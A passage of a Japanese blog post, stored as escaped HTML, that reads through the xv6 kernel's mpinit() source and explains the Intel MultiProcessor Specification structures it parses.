punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ismp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  lapic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;lapicaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; e&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPPROC&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
      proc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ncpu &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; NCPU&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ncpu&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; proc&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;apicid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// apicid may differ from ncpu&lt;/span&gt;
        ncpu&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPIOAPIC&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
      ioapic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      ioapicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;apicno&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPBUS&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPIOINTR&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; MPLINTR&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
      p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
      ismp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;ismp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Didn&apos;t find a suitable machine&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;imcrp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Bochs doesn&apos;t support IMCR, so this doesn&apos;t run on Bochs.&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// But it would on real hardware.&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// Select IMCR&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Mask external interrupts.&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;それではソースコードを順に読んでいきます。&lt;/p&gt;
&lt;h3 id=&quot;各種構造体変数の宣言&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%90%84%E7%A8%AE%E6%A7%8B%E9%80%A0%E4%BD%93%E5%A4%89%E6%95%B0%E3%81%AE%E5%AE%A3%E8%A8%80&quot; aria-label=&quot;各種構造体変数の宣言 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;各種構造体変数の宣言&lt;/h3&gt;
&lt;p&gt;関数呼び出し後、複数の構造体変数を宣言しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;uchar &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; ismp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;proc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ioapic&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これらはいずれも&lt;code class=&quot;language-text&quot;&gt;mp.h&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;p&gt;構造体の定義は以下です。&lt;/p&gt;
&lt;p&gt;詳細は実際に使用するソースコードを読む際に見ていくため、一旦割愛します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// See MultiProcessor Specification Version 1.[14]&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;             &lt;span class=&quot;token comment&quot;&gt;// floating pointer&lt;/span&gt;
  uchar signature&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// &quot;_MP_&quot;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;physaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// phys addr of MP config table&lt;/span&gt;
  uchar length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// 1&lt;/span&gt;
  uchar specrev&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// [14]&lt;/span&gt;
  uchar checksum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// all bytes must add up to 0&lt;/span&gt;
  uchar type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// MP system config type&lt;/span&gt;
  uchar imcrp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uchar reserved&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// configuration table header&lt;/span&gt;
  uchar signature&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// &quot;PCMP&quot;&lt;/span&gt;
  ushort length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// total table length&lt;/span&gt;
  uchar version&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// [14]&lt;/span&gt;
  uchar checksum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// all bytes must add up to 0&lt;/span&gt;
  uchar product&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;token comment&quot;&gt;// product id&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;oemtable&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// OEM table pointer&lt;/span&gt;
  ushort oemlength&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;token comment&quot;&gt;// OEM table length&lt;/span&gt;
  ushort entry&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// entry count&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lapicaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;token comment&quot;&gt;// address of local APIC&lt;/span&gt;
  ushort xlength&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// extended table length&lt;/span&gt;
  uchar xchecksum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;token comment&quot;&gt;// extended table checksum&lt;/span&gt;
  uchar reserved&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// processor table entry&lt;/span&gt;
  uchar type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// entry type (0)&lt;/span&gt;
  uchar apicid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// local APIC id&lt;/span&gt;
  uchar version&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// local APIC verison&lt;/span&gt;
  uchar flags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// CPU flags&lt;/span&gt;
    &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MPBOOT&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x02&lt;/span&gt;           &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// This proc is the bootstrap processor.&lt;/span&gt;&lt;/span&gt;
  uchar signature&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// CPU signature&lt;/span&gt;
  uint feature&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// feature flags from CPUID instruction&lt;/span&gt;
  uchar reserved&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// I/O APIC table entry&lt;/span&gt;
  uchar type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// entry type (2)&lt;/span&gt;
  uchar apicno&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// I/O APIC id&lt;/span&gt;
  uchar version&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// I/O APIC version&lt;/span&gt;
  uchar flags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// I/O APIC flags&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;addr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// I/O APIC address&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;mp仕様について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mp%E4%BB%95%E6%A7%98%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;mp仕様について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MP仕様について&lt;/h3&gt;
&lt;p&gt;ソースコードを読む前に、MP仕様についてまとめておきます。&lt;/p&gt;
&lt;p&gt;MPテーブルとは、x86CPUの持っているOSにマルチプロセッサの情報を取得させるための仕組みです。&lt;/p&gt;
&lt;p&gt;MPテーブルにはx86CPUのMP仕様に関連した情報が格納されています。&lt;/p&gt;
&lt;p&gt;以下は、Interlのドキュメントに記載されていたMP仕様のデータ構造の図です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;FLOATING POINTER STRUCTURE&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;FIXED-LENGTH HEADER&lt;/code&gt;を参照しています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/39dd9bb88a7189f5967b9d92bba7b4ba/0b533/image-29.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 86.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAARlAAAEZQAGA43XUAAAB7ElEQVQ4y2WUiY6CQBBE+f9vW40bz0QNuq4niqIg4NU7r9fGESfpMGdNdXUNQZ7nkmVZFcfjUXa7nSRJIpvNRrbbraRpKvv9Xk6nkySHg84d3Jc59p3PZ91TFIUEUmv3+70+JePxWJrNprRa3+5w/rZ2vV7fxsHj8RAL2uVyUabcBnu+MOr3+/Izmykb5gn6rNMMIzAga2ww+naoLEu53W7KhnnG9LmcvQaoDG3AAZppuo0iWSyXslgsZD6fayzdOM8L1W3m2DJGxw9AdIuijWr11WhoYSytenBZ5C5br9f69QE1ZR+dNAAjrSQ5aLV3Tj8OomPsxsUzfYCtum8MrWNf9AEUi2ANghQBYA6W2CkMQ5WD1IuirDACn65pCIgVJHdsGU+nU03T9xx7SNmsVgH6DNlU9xash8OhkyD+8CjZ+Fl+AGIFUlSmz5cAmyxLn0VJFQSmZycD/mRcAfroxN0JzkFYWWX/AbOqb15kTIEAN9t9aMiCsTJgWPvhW8guMpkCHwj6vFdEt0NxHGsxVquVGpm+WYbAUr51Xhq6Sv06C4STSVVFgioa4OoJ6L9nLnz7OfjUoQ2YvQA2YxlEf0Wia7aO+c1KyBP44hMsDAYDGY1GGp1OR9rttnS7XQ36vV5Pjc1e++NwFn3/AEu3IidA9NVQAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/39dd9bb88a7189f5967b9d92bba7b4ba/8ac56/image-29.webp 240w,
/static/39dd9bb88a7189f5967b9d92bba7b4ba/d3be9/image-29.webp 480w,
/static/39dd9bb88a7189f5967b9d92bba7b4ba/b0a15/image-29.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/39dd9bb88a7189f5967b9d92bba7b4ba/8ff5a/image-29.png 240w,
/static/39dd9bb88a7189f5967b9d92bba7b4ba/e85cb/image-29.png 480w,
/static/39dd9bb88a7189f5967b9d92bba7b4ba/0b533/image-29.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/39dd9bb88a7189f5967b9d92bba7b4ba/0b533/image-29.png&quot;
            alt=&quot;2022/01/image-29.png&quot;
            title=&quot;2022/01/image-29.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel MultiProcessor Specification  | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この&lt;code class=&quot;language-text&quot;&gt;FLOATING POINTER STRUCTURE&lt;/code&gt;は、MPフローティングポインタ構造体であり、xv6OSでは&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;構造体として定義されていました。&lt;/p&gt;
&lt;p&gt;システムにMPフローティングポインタ構造体が存在する場合、そのシステムはMP仕様に準拠していることを意味します。&lt;/p&gt;
&lt;p&gt;MPフローティングポインタ構造体には以下の情報が含まれます。&lt;/p&gt;
&lt;ul&gt;
